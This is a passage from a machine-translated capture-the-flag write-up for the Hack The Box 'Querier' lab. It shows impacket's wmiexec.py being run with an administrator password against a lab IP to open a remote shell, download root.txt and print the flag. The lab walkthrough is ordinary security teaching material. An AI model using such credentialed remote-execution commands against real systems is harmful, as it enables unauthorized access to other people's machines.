translated">我们不需要讨厌的假信任的Sec</h2><div class="ne l"><h3 class="bd b gy z fp nc fr fs nd fu fw dk translated">在Metasploit、smbexec、winexe中使用psexec模块等PSexec风格的工具是很常见的</h3></div><div class="nf l"><p class="bd b dl z fp nc fr fs nd fu fw dk translated">www.trustedsec.com</p></div></div><div class="ng l"><div class="oc l ni nj nk ng nl ks mx"/></div></div></a></div><p id="b664" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用creds运行wmiexec.py，我们可以获得root.txt并从本地机器上读取它。</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="60e7" class="mc kv iq ly b gy md me l mf mg">➜  Querier /opt/impacket/examples/wmiexec.py Administrator:MyUnclesAreMarioAndLuigi\!\!1\!@10.10.10.125                          <br/>Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><span id="d55a" class="mc kv iq ly b gy mh me l mf mg">[*] SMBv3.0 dialect used<br/>[!] Launching semi-interactive shell - Careful what you execute<br/>[!] Press help for extra shell commands<br/>C:\&gt;help</span><span id="3aa6" class="mc kv iq ly b gy mh me l mf mg">lcd {path}                 - changes the current local directory to {path}<br/> exit                       - terminates the server process (and this session)<br/> put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)<br/> get {file}                 - downloads pathname to the current local dir <br/> ! {cmd}                    - executes a local shell cmd</span><span id="c687" class="mc kv iq ly b gy mh me l mf mg">C:\&gt;get c:\users\administrator\desktop\root.txt<br/>[*] Downloading c:\\users\administrator\desktop\root.txt<br/>C:\&gt;exit<br/>➜  Querier cat root.txt <br/><strong class="ly ir">b19c3794f786....</strong></span></pre><p id="113d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们现在可以读取root.txt，也可以放入和获取文件。我成功地放入了一个文本文件，但是还没有到放入shell的程度。</p><p id="2d40" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是我如何从黑盒子里做盒子查询的。我希望你能从这次演练中学到一些东西。干杯！🍺</p></div></div>    
</body>
</html>